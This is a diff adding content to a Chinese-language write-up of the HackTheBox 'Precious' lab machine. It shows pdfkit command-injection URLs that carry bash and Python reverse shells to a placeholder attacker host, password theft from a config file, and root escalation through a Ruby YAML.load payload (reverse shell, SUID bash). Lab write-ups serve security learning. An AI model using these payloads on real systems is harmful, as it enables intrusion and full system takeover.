@@ -1,4 +1,4 @@
-**Waiting for machine retire...**
+*Difficulty: Easy*
 
 ---
 
@@ -8,6 +8,8 @@
 ports=$(nmap -n -Pn -sS  -p- <ip> --max-retries=1 | grep ^[0-9] | cut -d / -f1 | tr '\n' ',' | sed s/,$//)
 nmap -v -n -sC -sV -p ${ports} <ip> -oN Precious.nmap
 ```
+
+只扫出22、80端口。
 
 
 ## 漏洞分析
@@ -43,27 +45,94 @@ nmap -v -n -sC -sV -p ${ports} <ip> -oN Precious.nmap
 
 ## foothold
 
+- 尝试反弹shell（无效）  
+```
+http://<ip>/?name=#{'%20\`bash -i >& /dev/tcp/<ip>/<port> 0>&1`'} 
+```
+
+- 试一下base64（无效）  
+``` 
+http://<ip>/?name=#{'%20`echo YmFzaCAtaSA+JiAv......IDA+JjE=|base64 -d`'} 
+```  
+
+- 套一层shell执行（无效）  
+```
+http://<ip>/?name=#{'%20`bash -c "echo YmFzaCAtaSA+JiAv......IDA+JjE=|base64 -d"`'} 
+```  
+
+- python3可以  
+```
+http://<ip>/?name=#{'%20`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ip>",<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'`'} 
+```
+
+*不过后来回顾的时候，在本地试了一下无效的那几个：*  
+*第一个报错：没有那个文件或目录: /dev/tcp/&lt;ip&gt;/&lt;port&gt;。*  
+*第二、三个报错：>&: 没有那个文件或目录。*  
+*而base64尝试这个可以： `` http://example.com/?name=#{'%20`echo YmFzaCAtaSA+JiAv......IDA+JjE=|base64 -d|bash`'} `` (不能用 `bash -c` ？)*  
+
+*后来才发现下载完pdf后，get shell其实并不必一直用local URL。直接 `` http://example.com/?name=#{'%20`sleep 5`'} `` 也行。*
+
+*以及其实既然 [PoC](https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795) 是ruby的pdfkit漏洞，其实直接找ruby的getshell写法就是了。。。*
+
+get shell后，`id` 是ruby账户。
+
 ### 升级为交互式shell
 
+因为本来就是python反弹的bash所以直接：
+```bash
+export TERM=xterm
+Ctrl+Z
+stty raw -echo; fg
+```
 
-## get user flag
+
+## get user flag 
+
+home目录有用户 `henry`，而ruby的家目录 `.bundle/config` 里有其密码。  
+转到henry账号，其家目录有flag。
+
 
 ## 提权
 
 `sudo -l` 一般是我首先会尝试的。  
+henry的 `sudo -l` 发现有root权限无密码执行 `/usr/bin/ruby /opt/update_dependencies.rb` 
 
 ### PoC
 
-### 方法1：sudo反弹root shell
+`update_dependencies.rb` 脚本里面有load文件的方法就十分让人在意（`YAML.load(File.read("dependencies.yml"))`）  
+谷歌：ruby yaml.load file exploit  
+找到这篇[PoC文章](https://staaldraad.github.io/post/2019-03-02-universal-rce-ruby-yaml-load/)（文章最下面有github的payload）
+
+复制 `/opt/sample/dependencies.yml` (到家目录)并将payload写入。  
+```bash
+sudo /usr/bin/ruby /opt/update_dependencies.rb
+``` 
+执行后有回显id命令的结果是root。
+
+### 方法1：反弹root shell
+
+注入 `"bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'"`  
+
+- 只有 'bash -i >& /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0>&1' 的话会有"bad fd"报错。
 
 ### 方法2：给bash命令添加SUID
 
+注入 `"chmod +s /bin/bash"`，然后执行 `bash -p` 即可获得附加了root的shell  
+
+- *ref: <https://0xdedinfosec.vercel.app/blog/hackthebox-precious-writeup>*
+- 还不太懂这个 `bash -p` 的原理，留坑
+
 ### 方法3：命令执行
 
+后来想想，由于只是单纯拿flag
+
+- 可以直接注入 `"bash"` 拿root shell
+- 或者直接注入 `"cat /root/root.txt"` 拿flag
 
 
+## get root falg
 
-## get root flag
+`cat /root/root.txt`
 
 ---
 
